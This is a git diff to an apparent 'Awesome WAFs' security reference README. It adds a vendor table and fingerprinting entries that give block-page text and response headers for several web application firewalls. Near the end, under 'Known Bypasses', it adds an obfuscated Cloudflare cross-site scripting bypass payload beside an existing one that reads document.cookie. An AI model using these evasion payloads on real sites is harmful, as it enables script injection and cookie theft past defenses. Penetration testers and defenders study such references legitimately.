@@ -20,9 +20,57 @@ Feel free to [contribute](CONTRIBUTING.md).
 
 ## Awesome WAFs List
 Here are all commonly known WAFs:
-|<a href="https://f5.com/products/big-ip/appl|  |
-|--|--|
-|  |  |
+
+<table>
+    <tr>
+        <td>
+            <a href="http://360.cn">360 WangZhanBao</a>
+        </td>
+        <td>
+            <a href="https://www.airlock.com/products/airlock-waf/">Airlock</a>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <a href="http://www.anquanbao.com">Anquanbao</a>
+        </td>
+        <td>
+            <a href="https://www.armor.com/armor-web-application-firewall-service">Armor</a>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <a href="https://f5.com/products/big-ip/application-security-manager-asm">Application Security Manager</a>
+        </td>
+        <td>
+            <a href="https://aws.amazon.com/waf/">Amazon AWS WAF</a>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <a href="https://cloud.baidu.com">Baidu Cloud WAF</a>
+        </td>
+        <td>
+            <a href="https://www.barracuda.com/products/webapplicationfirewall">Barracuda</a>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <a href="http://binarysec.org">BinarySec</a>
+        </td>
+        <td>
+            <a href="https://www.blockdos.net">BlockDoS</a>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <a href="https://en.chinacache.com/managed-web-application-firewall/">ChinaCache</a>
+        </td>
+        <td>
+            
+        </td>
+    </tr>
+</table>
 
 
 ## Testing Methodology
@@ -46,8 +94,8 @@ One that uses a mixed concept of blacklisting and whitelisting stuff.
 - Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
 - Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
 - Some often alter headers and jumble characters to confuse attacker (eg. Citrix Netscaler, Big IP WAF).
-- Some (often rare) expose themselves in the `Server` header
-- Some WAFs expose themselves in the response content (eg. DotDefender, Armor, truShield Sitelock).
+- Some (often rare) expose themselves in the `Server` header (eg. Approach WAF).
+- Some WAFs expose themselves in the response content (eg. DotDefender, Armor, Sitelock).
 - Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight).
 
 ### Detection Techniques:
@@ -163,6 +211,27 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Approach Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page content may contain:</li>
+                        <ul>
+                            <li><code>Approach Web Application Firewall</code> text.</li>
+                            <li><code>Your IP address has been logged and this information could be used by authorities to track you.</code> warning.</li>
+                            <li><code>Sorry for the inconvenience!</code> keyword.</li>
+                            <li><code>If this was an legitimate request please contact us with details!</code> text.</li>
+                        </ul>
+                    <li><code>Server</code> header has field value set to <code>Approach Web Application Firewall</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Amazon AWS WAF
         </td>
         <td>
@@ -222,7 +291,7 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            BitNinja
+            BitNinja Firewall
         </td>
         <td>
             <ul>
@@ -608,6 +677,24 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            ISAServer
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response page contains:</li>
+                    <ul>
+                        <li><code>The ISA Server denied the specified Uniform Resource Locator (URL)</code> text.</li>
+                        <li><code>The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.</code> text</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Janusec Application Gateway
         </td>
         <td>
@@ -667,6 +754,24 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Malcare (Inactiv)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page may contains:</li>
+                        <ul>
+                            <li><code>Blocked because of Malicious Activities</code> text.</li>
+                            <li><code>Firewall powered by MalCare</code> text.</li>
+                        </ul>
+               </ul>
+            </ul>
+        </td>
+    </tr>    
+    <tr>
+        <td>
             ModSecurity (Trustwave)
         </td>
         <td>
@@ -694,7 +799,7 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detectability: </b>Easy</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response headers contain <code>naxsi/waf</code> keyword.</li>
+                    <li>Response headers contain unusual field <code>X-Data-Origin</code> with value <code>naxsi/waf</code> keyword.</li>
                 </ul>
             </ul>
         </td>
@@ -715,7 +820,28 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Citrix NetScaler
+            NinjaFirewall (NinTechNet)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response page title contains <code>NinjaFirewall: 403 Forbidden</code>.</li>
+                    <li>Response page contains:
+                        <ul>
+                            <li><code>For security reasons, it was blocked and logged</code> text.</li>
+                            <li><code>NinjaFirewall</code> keyword.</li>
+                        </ul>
+                    </li>
+                    <li>Returns a <code>403 Forbidden</code> response upon malicious requests.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            NetScaler (Citrix)
         </td>
         <td>
             <ul>
@@ -758,6 +884,22 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response headers contain <code>NSFocus</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            onMessage Shield (Blackbaud)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contain unusual header <code>X-Engine</code> field with value <code>onMessage Shield</code>.</li>
+                    <li>Response page may contain <code>onMessage SHIELD</code> keyword.</li>
+                    <li>You might encounter response page with<br><code>This site is protected by an enhanced security system to ensure a safe browsing experience</code>.</li>
                 </ul>
             </ul>
         </td>
@@ -955,6 +1097,38 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            SiteGround Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains<br> <code>The page you are trying to access is restricted due to a security rule</code> text.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            SiteGuard (JP Secure)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response page contains:
+                    <ul>
+                        <li><code>Powered by SiteGuard</code> text.</li>
+                        <li><code>The server refuse to browse the page.</code> text</li>
+                    </ul> 
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             SiteLock TrueShield
         </td>
         <td>
@@ -1002,6 +1176,39 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Blocked response page contains <code>Powered by UTM Web Protection</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            SquareSpace Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response code returned is <code>404 Not Found</code> upon malicious requests.</li>
+                    <li>Blocked response page contains either of the following text:</li>
+                    <ul>
+                        <li><code>BRICK-50</code> keyword.</li>
+                        <li><code>404 Not Found</code> text.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            StackPath (StackPath LLC)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains<br> <code>You performed an action that triggered the service and blocked your request</code>.</li>
                 </ul>
             </ul>
         </td>
@@ -1067,6 +1274,26 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Response headers might contain <code>F5-TrafficShield</code> keyword.</li>
                     <li><code>ASINFO=</code> value might be detected in response headers.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            URLMaster SecurityCheck (iFinity/DotNetNuke)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers might contain:
+                    <ul>
+                        <li><code>UrlMaster</code> keyword.</li>
+                        <li><code>UrlRewriteModule</code> keyword.</li>
+                        <li><code>SecurityCheck</code> keyword.</li>
+                    </ul> 
+                    <li>Blocked response code returned is <code>400 Bad Request</code> text.</li>
                 </ul>
             </ul>
         </td>
@@ -1386,9 +1613,10 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 ## Google Dorks Approach:
 
 ## Known Bypasses:
-- __Cloudflare__ - Cross Site Scripting _([Source](https://twitter.com/ArbazKiraak/status/1090654066986823680))_
+- __Cloudflare__ - Cross Site Scripting _([Source1](https://twitter.com/ArbazKiraak/status/1090654066986823680), [Source2](https://twitter.com/LooseSecurity/status/1094615936223625216?s=20))_
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
 ```
 
 - __Imperva SecureSphere__ 
